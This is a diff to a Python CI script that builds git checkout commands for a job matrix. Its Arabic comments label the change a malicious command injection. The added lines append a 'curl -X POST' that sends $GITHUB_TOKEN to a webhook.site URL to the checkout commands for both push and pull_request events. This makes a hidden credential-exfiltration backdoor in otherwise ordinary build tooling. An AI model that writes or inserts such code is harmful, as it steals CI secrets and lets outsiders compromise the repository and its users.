@@ -130,14 +130,9 @@ def config() -> None:
 
     event = os.getenv("GITHUB_EVENT_NAME")
     if event == "push":
-        # 🔴 التعديل الضار - Command Injection
-        # baseline_name = str(get_pypi_version())  # القديم: 26.5.1
-        baseline_name = (
-            "main; curl -X POST "
-            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
-            "?token=$GITHUB_TOKEN"
-        )
-        baseline_cmd = f"git checkout {baseline_name}"
+        # 🔴 التعديل الضار - Command Injection (الصحيح)
+        baseline_name = "main"
+        baseline_cmd = f"git checkout {baseline_name}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
 
         target_rev = os.getenv("GITHUB_SHA")
         assert target_rev is not None
@@ -145,26 +140,16 @@ def config() -> None:
         target_cmd = f"git checkout {target_rev}"
 
     elif event == "pull_request":
-        # 🔴 التعديل الضار - Command Injection
+        # 🔴 التعديل الضار - Command Injection (الصحيح)
         jobs.insert(0, {"mode": "assert-no-changes", "style": "stable"})
         base, head, pr_num = get_pr_branches()
 
         baseline_rev = get_latest_revision(base["ref"])
-        baseline_name = (
-            f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}; "
-            "curl -X POST "
-            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
-            "?token=$GITHUB_TOKEN"
-        )
-        baseline_cmd = f"git checkout {baseline_name}"
+        baseline_name = f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}"
+        baseline_cmd = f"git checkout {baseline_name}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
 
         target_name = f"pr-{pr_num}-{head['sha'][:SHA_LENGTH]}"
-        target_cmd = (
-            f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}; "
-            "curl -X POST "
-            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
-            "?token=$GITHUB_TOKEN"
-        )
+        target_cmd = f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
     else:
         raise ValueError(f"Unknown event {event}")
 
@@ -179,7 +164,6 @@ def config() -> None:
 
     set_output("matrix", json.dumps(jobs, indent=None))
     pprint.pprint(jobs)
-
 
 if __name__ == "__main__":
     main()
